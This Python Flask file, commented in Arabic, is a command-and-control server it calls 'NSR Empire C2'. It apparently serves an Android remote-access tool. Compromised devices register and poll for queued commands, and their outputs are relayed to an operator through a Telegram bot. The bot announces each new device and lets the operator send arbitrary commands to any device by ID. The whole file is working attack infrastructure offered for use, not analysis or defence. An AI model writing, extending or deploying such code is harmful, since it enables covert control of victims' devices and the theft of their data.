import os
import logging
import threading
from flask import Flask, request, jsonify
import telebot

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# ذاكرة الأجهزة والمهام المعلقة
connected_devices = {}
pending_commands = {}

@app.route('/')
def index():
    return jsonify({"status": "online", "system": "NSR Empire C2", "version": "7.11"}), 200

@app.route('/api/v1/stream', methods=['POST', 'GET'])
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json if request.is_json else request.form.to_dict()
        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
        
        # التأكد إذا كان الجهاز متصلاً سابقاً لمنع تكرار الرسائل
        is_new_device = device_id not in connected_devices
        connected_devices[device_id] = data or {"status": "connected"}
        
        # إرسال الإشعار مرّة واحدة فقط للاتصال الجديد!
        if is_new_device and bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID, 
                f"🚨 <b>جهاز جديد متصل الآن!</b>\n\n- ID الجهاز: <code>{device_id}</code>\n- استخدم /cmd {device_id} [الأمر] لإرسال أمر."
            )
        
        # البحث عن أوامر معلقة للجهاز
        cmd_to_run = pending_commands.pop(device_id, "wait")
        return jsonify({"status": "success", "command": cmd_to_run}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', '')
        
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"📥 <b>نتيجة تنفيذ أمر ({task_type})</b>\n\n- الجهاز: <code>{device_id}</code>\n\n<code>{str(content)[:3000]}</code>"
            )
        return jsonify({"status": "received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        help_text = (
            "🤖 <b>لوحة تحكم إمبراطورية NSR C2</b>\n\n"
            "📋 <b>الأوامر المتاحة:</b>\n"
            "• /devices - عرض قائمة الأجهزة المتصلة\n"
            "• /cmd [ID] [الأمر] - إرسال أمر للجهاز\n\n"
            "<i>مثال لإرسال أمر:</i>\n<code>/cmd Android_Device_Client get_info</code>"
        )
        bot.reply_to(message, help_text)

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        if not connected_devices:
            bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة حالياً.")
            return
            
        msg = "📱 <b>الأجهزة النشطة حالياً:</b>\n\n"
        for dev_id in connected_devices.keys():
            msg += f"• <code>{dev_id}</code>\n"
        bot.reply_to(message, msg)

    @bot.message_handler(commands=['cmd'])
    def send_command(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            bot.reply_to(message, "⚠️ الصيغة خاطئة!\nالاستخدام: <code>/cmd [ID_الجهاز] [الأمر]</code>")
            return
            
        target_id = args[1]
        command_str = args[2]
        
        pending_commands[target_id] = command_str
        bot.reply_to(message, f"⏳ تم تسجيل الأمر <code>{command_str}</code> للجهاز <code>{target_id}</code>.\nسيتم تنفيذه عند الدورة القادمة.")

    def run_bot():
        try:
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
